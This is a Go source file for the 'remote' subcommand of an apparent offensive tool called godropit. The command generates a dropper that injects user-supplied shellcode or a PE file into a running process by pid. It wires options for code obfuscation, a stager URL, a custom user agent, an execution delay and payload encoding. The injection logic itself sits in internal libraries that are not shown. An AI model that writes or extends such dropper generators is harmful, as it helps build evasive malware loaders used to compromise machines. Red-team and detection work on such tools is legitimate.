package cmd

import (
	"log"

	"godropit/internal/godroplib/remote"
	"godropit/pkg/gengo"

	"github.com/spf13/cobra"
)

var pid string

// remoteCmd represents the remote command
var remoteCmd = &cobra.Command{
	Use:   "remote",
	Short: "Execute in the remote process",
	Long:  `Executes in the remote process. Executes shellcode in the specified pid. `,
	Run: func(cmd *cobra.Command, args []string) {
		checkImg()
		if input == "" {
			log.Fatalln("Please pass shellcode with -i <shellcodefile.bin|PE.exe>")
		}
		name = check(name)
		var remoteDrop gengo.Dropper
		var Dtype gengo.DtypeRemote
		var err error
		gengo.Garble = garble

		Dtype.Args = procArgs
		Dtype.Pid = pid
		remoteDrop.Delay = time
		remoteDrop.Arch = arch
		remoteDrop.Shared = shared
		remoteDrop.Debug = debug

		remoteDrop.Dtype, err = gengo.GenDTypeRemote(Dtype)
		if err != nil {
			log.Fatalln(err)
		}

		remoteDrop.Dlls, remoteDrop.Inject, remoteDrop.Import, remoteDrop.Extra = remote.SelectRemote()

		gengo.NewDropper(remoteDrop, name, domain, input, output, stagerurl, imgpath, hostname, ua, sgn)
	},
}

func init() {
	newCmd.AddCommand(remoteCmd)

	remoteCmd.MarkFlagRequired("in")
	remoteCmd.MarkFlagRequired("name")
	remoteCmd.MarkFlagRequired("out")

	// remote specific flags
	remoteCmd.Flags().StringVar(&pid, "pid", "0", "Set remote process pid, default is 0")
}
